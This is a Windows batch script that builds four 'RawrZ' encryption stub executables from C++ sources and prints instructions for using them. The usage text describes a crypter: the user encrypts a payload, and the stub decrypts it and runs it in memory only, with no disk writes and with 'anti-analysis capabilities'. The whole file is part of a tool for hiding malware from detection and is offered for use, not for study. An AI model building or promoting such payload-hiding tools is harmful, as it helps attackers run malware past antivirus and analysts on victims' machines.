@echo off
echo Building RawrZ Custom Encryption Stubs...

REM Build Hybrid Stub
echo.
echo [+] Building Hybrid Stub...
cl /std:c++17 /EHsc RawrZHybridStub.cpp /link /out:RawrZHybrid.exe
if %ERRORLEVEL% EQU 0 (
    echo [+] Hybrid Stub built successfully: RawrZHybrid.exe
) else (
    echo [-] Hybrid Stub build failed!
)

REM Build Triple Stub
echo.
echo [+] Building Triple Stub...
cl /std:c++17 /EHsc RawrZTripleStub.cpp /link /out:RawrZTriple.exe
if %ERRORLEVEL% EQU 0 (
    echo [+] Triple Stub built successfully: RawrZTriple.exe
) else (
    echo [-] Triple Stub build failed!
)

REM Build Enhanced Stub
echo.
echo [+] Building Enhanced Stub...
cl /std:c++17 /EHsc RawrZEnhancedStub.cpp /link /out:RawrZEnhanced.exe
if %ERRORLEVEL% EQU 0 (
    echo [+] Enhanced Stub built successfully: RawrZEnhanced.exe
) else (
    echo [-] Enhanced Stub build failed!
)

REM Build CrossPlatform Stub
echo.
echo [+] Building CrossPlatform Stub...
cl /std:c++17 /EHsc RawrZCrossPlatformStub.cpp /link /out:RawrZCrossPlatform.exe
if %ERRORLEVEL% EQU 0 (
    echo [+] CrossPlatform Stub built successfully: RawrZCrossPlatform.exe
) else (
    echo [-] CrossPlatform Stub build failed!
)

echo.
echo === Custom Encryption Stubs Build Complete ===
echo.
echo Generated executables:
echo   RawrZHybrid.exe       - Hybrid encryption (salt + XOR + rotation)
echo   RawrZTriple.exe       - Triple-layer encryption (3 rounds)
echo   RawrZEnhanced.exe     - Enhanced encryption (S-box + rotation + XOR)
echo   RawrZCrossPlatform.exe - Cross-platform encryption (CBC-like mode)
echo.
echo Usage:
echo   1. Encrypt your payload with the corresponding method
echo   2. Save as payload.[Method].encrypted
echo   3. Run the appropriate stub executable
echo   4. Stub will decrypt and execute payload in memory
echo.
echo Features:
echo   - Zero external dependencies (pure Windows API)
echo   - Memory-only execution (no disk writes)
echo   - Custom encryption algorithms
echo   - Anti-analysis capabilities
echo.
pause
